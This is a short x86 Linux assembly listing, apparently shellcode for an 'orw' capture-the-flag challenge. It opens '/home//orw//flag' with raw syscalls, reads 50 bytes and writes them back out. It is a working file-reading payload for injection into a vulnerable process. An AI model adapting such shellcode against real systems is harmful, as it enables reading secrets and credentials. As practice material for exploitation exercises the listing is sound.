section .text
global _start
_start:

;open flag

xor eax, eax
xor ebx, ebx
xor ecx, ecx
mov al, 5
push ecx
push 0x67616c66
push 0x2f2f7772
push 0x6f2f2f65
push 0x6d6f682f
mov ebx, esp
xor ecx, ecx
int 0x80

;read flag
xor ebx, ebx
xor ecx, ecx
xor edx, edx
mov ebx, eax
xor eax, eax
mov al, 3
mov dl, 50
sub esp, 50
mov ecx, esp
int 0x80

;write flag
xor eax, eax
xor ebx, ebx
mov al, 4
int 0x80

;exit
mov al, 1
xor ebx, ebx
xor ecx, ecx
xor edx, edx
int 0x80

